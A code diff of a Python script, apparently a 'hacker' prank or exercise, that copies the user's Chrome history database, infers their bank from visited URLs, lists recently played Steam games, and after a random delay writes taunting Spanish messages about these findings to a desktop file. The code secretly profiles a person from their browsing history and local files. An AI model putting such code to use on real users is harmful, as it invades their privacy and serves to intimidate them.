@@ -1,6 +1,7 @@
 import os
 import re
 import time
+from shutil import copyfile
 from time import sleep
 from random import randrange
 from pathlib import Path
@@ -13,7 +14,12 @@ home_path = "{}".format(Path.home())
 desktop_path = home_path + "/Desktop/"
 timestr = time.strftime("%Y%m%d-%H%M%S")
 FILE = desktop_path + timestr + "eps3.7dont-delete-me.ko"
-history_path = "/home/" + os.getlogin() + "/.config/google-chrome/Default/History"
+ori_history_path = "/home/" + os.getlogin() + "/.config/google-chrome/Default/History"
+history_path = "/home/" + os.getlogin() + "/.config/google-chrome/Default/Historytemp"
+
+
+def copy_history():
+    copyfile(ori_history_path, history_path)
 
 def delay_action():
     n_hours = randrange(1, 4)
@@ -37,6 +43,7 @@ def create_hacker_file():
 
 
 def get_chrome_history():
+    copy_history()
     urls = None
     while not urls:
         try:
@@ -96,20 +103,17 @@ def check_bank_account(hacker_file, chrome_history):
                 break
         if his_bank:
             break
-    hacker_file.write("Ademas veo que tu banco es el {}".format(his_bank))
+    hacker_file.write("Ademas veo que tu banco es el {} \n".format(his_bank))
 
 
 def check_steam_games(hacker_file):
     steam_path = home_path + "/.local/share/Steam/steamapps/common/*"
-    if os.path.exists(steam_path):
-        games = []
-        game_paths = glob.glob(steam_path)
-        game_paths.sort(key=os.path.getmtime, reverse=True)
-        for game_path in game_paths:
-            games.append(game_path.split("/")[-1])
-        hacker_file.write("He visto que has estado jugando ultimamente a {}".format(", ".join(games[:3])))
-    else:
-        pass
+    games = []
+    game_paths = glob.glob(steam_path)
+    game_paths.sort(key=os.path.getmtime, reverse=True)
+    for game_path in game_paths:
+        games.append(game_path.split("/")[-1])
+    hacker_file.write("He visto que has estado jugando ultimamente a {} \n".format(", ".join(games[:3])))
 
 
 def main():
